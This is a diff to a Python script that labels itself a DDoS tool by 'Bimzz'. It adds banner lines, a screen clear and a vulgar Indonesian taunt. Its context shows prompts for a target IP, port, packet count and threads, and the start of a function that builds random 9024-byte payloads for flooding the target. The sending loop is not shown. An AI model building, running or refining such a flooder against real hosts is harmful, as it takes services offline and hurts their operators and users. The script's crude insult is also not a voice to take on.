@@ -2,16 +2,20 @@
 # CODE BY BIMZZ
 
 #IMPORT
+import sys
+import os
 import random
+import time
 import socket
 import threading
 
 #UBAH AUTHOR YATIM
 print("------------------------------------------------")
+print("[+] Tools DDoS BETA VERSION By Bimzz")
 print("[+] Discord : KyBimzZ  び#1716")
 print("[+] YouTube : Bimzz")
-print("[+] Author : Bimzz x KyTeam")
-print("[+] KyTeam : https://discord.gg/YMT9utYW5U")
+print("[+] Author  : Bimzz x KyTeam")
+print("[+] KyTeam  : https://discord.gg/YMT9utYW5U")
 print("------------------------------------------------")
 
 ip = str(input("[Bimzz] IP TARGET : "))
@@ -19,6 +23,9 @@ port = int(input("[Bimzz] IP TARGET : "))
 times = int(input("[Bimzz] PACKETS : "))
 threads = int(input("[Bimzz] THREADS (9024) : "))
 
+os.system("clear")
+print("[Bimzz] | Sabar Kontol...")
+time.sleep(3)
 def run():
     data = random._urandom(9024)
     i = random.choice(("[*]","[!]","[#]"))
